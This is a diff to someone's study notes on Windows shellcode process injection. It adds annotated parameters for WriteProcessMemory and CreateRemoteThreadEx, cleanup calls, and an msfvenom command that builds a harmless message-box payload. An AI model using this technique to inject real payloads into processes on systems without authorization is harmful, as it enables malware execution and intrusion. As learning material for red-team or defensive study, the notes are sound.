@@ -137,11 +137,11 @@ if (rAlloc_mem == NULL) {
 WRITING SHELLCODE INTO PROCESS MEMORY
 -------------------------------------
 BOOL WriteProcessMemory(
-  [in] HANDLE hProcess,
-  [in] LPVOID lpBaseAddress,
-  [in] LPCVOID lpBuffer,
-  [in] SIZE_T nSize,
-  [out, optional] SIZE_T *lpNumberOfBytesWritten
+  [in] HANDLE hProcess, // Handle to the process where memory will be written.
+  [in] LPVOID lpBaseAddress, // Pointer to the base address in the target process where memory will be written.
+  [in] LPCVOID lpBuffer,// Pointer to the buffer containing the data to write.
+  [in] SIZE_T nSize, // Size of the data to write, in bytes.
+  [out, optional] SIZE_T *lpNumberOfBytesWritten // Optional pointer to a variable that receives the number of bytes written.
 );
 
 Example:
@@ -155,15 +155,32 @@ Example:
 
 CREATING A REMOTE THREAD
 -------------------------
+this function creates a thread in the specified process, allowing us to execute code in the context of that process.
+a thread is a lightweight process that can run concurrently with other threads in the same process.
+we can see it as a way to run our shellcode in the target process.
+a remote thread is a thread that runs in the address space of another process, which is what we need for process injection.
+
 CreateRemoteThreadEx(
-[in] HANDLE hProcess,
-[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes,
-[in] SIZE_T dwStackSize,
-[in] LPTHREAD_START_ROUTINE lpStartAddress,
-[in, optional] LPVOID lpParameter,
-[in] DWORD dwCreationFlags,
-[out, optional] LPDWORD lpThreadId
+[in] HANDLE hProcess, // Handle to the target process where the thread will be created.
+[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // Pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes.
+[in] SIZE_T dwStackSize,  // Initial size of the stack for the new thread. If 0, the default size is used.
+[in] LPTHREAD_START_ROUTINE lpStartAddress, // Pointer to the function to be executed by the thread. This is where our shellcode will be executed.
+[in, optional] LPVOID lpParameter, // Pointer to a variable to be passed to the thread function. This can be NULL if no parameters are needed.
+[in] DWORD dwCreationFlags, // Flags that control the creation of the thread (e.g., CREATE_SUSPENDED to create the thread in a suspended state).
+[out, optional] LPDWORD lpThreadId // Pointer to a variable that receives the thread identifier. This can be NULL if you don't need the ID.
 );
+
+Note:
+In (LPTHREAD_START_ROUTINE)rAlloc_mem, the cast is needed because CreateRemoteThread expects a function pointer of type LPTHREAD_START_ROUTINE.
+
+To put it simply:
+We're telling the system,
+👉 “Treat this address (rAlloc_mem) as a pointer to a function you can run as a thread.”
+
+This is required because CreateRemoteThread won’t accept just any address — it needs to know it's a callable function.
+
+In dwCreationFlags, we can use 0 to create the thread in a normal state, or CREATE_SUSPENDED if we want to create it in a suspended state (not running immediately).
+
 
 Example:
   HANDLE hThread = CreateRemoteThreadEx(
@@ -182,6 +199,29 @@ Example:
   } else {
       okay("Successfully created remote thread");
   }
+
+CLEANING UP and WAITING FOR THREAD TO FINISH
+-----------------------------------------
+we will use WaitForSingleObject to wait for the remote thread to finish executing.
+  WaitForSingleObject(hThread, INFINITE);
+  DWORD WaitForSingleObject(
+  [in] HANDLE hHandle, // Handle to the object to wait for (in this case, the remote thread).
+  [in] DWORD  dwMilliseconds // Time-out interval in milliseconds. INFINITE means wait indefinitely.
+  );
+
+now for VirtualFreeEx, we will use it to free the allocated memory in the target process after we're done with it.
+  VirtualFreeEx(hProcess, rAlloc_mem, 0, MEM_RELEASE);
+  BOOL VirtualFreeEx(
+  [in] HANDLE hProcess, // Handle to the target process.
+  [in] LPVOID lpAddress, // Pointer to the base address of the memory to free.
+  [in] SIZE_T dwSize, // Size of the memory to free. If 0, the entire region is freed.
+  [in] DWORD dwFreeType // Type of free operation (e.g., MEM_RELEASE).
+  );
+
+Finally, we close the handles to clean up resources:
+  CloseHandle(hThread);
+  CloseHandle(hProcess);
+
 GENERATING SHELLCODE (KALI)
 ----------------------------
 msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode
